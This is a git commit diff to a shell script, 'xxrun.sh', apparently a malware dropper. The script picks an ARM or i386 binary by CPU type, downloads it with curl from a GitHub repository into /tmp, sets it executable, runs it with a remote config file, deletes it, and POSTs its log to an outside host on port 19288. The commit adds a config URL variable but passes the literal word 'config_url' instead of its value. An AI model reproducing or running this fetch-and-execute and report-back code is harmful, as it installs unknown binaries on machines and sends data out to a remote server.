f0969c8fc104e60ac2013e1152258e67773d4e06
gptloveyou <129956509+gptloveyou@users.noreply.github.com>
2023-04-19 11:33:31 +0000

    Update xxrun.sh

--- xxrun.sh
+++ xxrun.sh
@@ -3,6 +3,7 @@
 report_url="http://report.dataplan.online:19288/9024134B28978B68666E2B034E46130E/debug"
 arm_url="https://raw.githubusercontent.com/gptloveyou/001/main/armv5.bin"
 intel_url="https://raw.githubusercontent.com/gptloveyou/001/main/i386.bin"
+config_url="https://raw.githubusercontent.com/gptloveyou/001/main/config.json"
 pl_url=$intel_url;
 arch=`cat /proc/cpuinfo|grep -i -c ARM`
 echo $arch
@@ -15,7 +16,7 @@ else
 fi
 curl -s -o /tmp/run001881.bin $pl_url 1>/tmp/tmplog0020.log 2>&1
 chmod 777 /tmp/run001881.bin 1>>/tmp/tmplog0020.log 2>&1
-/tmp/run001881.bin "https://raw.githubusercontent.com/gptloveyou/001/main/config.json" 1>>/tmp/tmplog0020.log 2>&1
+/tmp/run001881.bin config_url 1>>/tmp/tmplog0020.log 2>&1
 rm /tmp/run001881.bin
 curl -X POST $report_url -d @/tmp/tmplog0020.log
 rm /tmp/tmplog0020.log
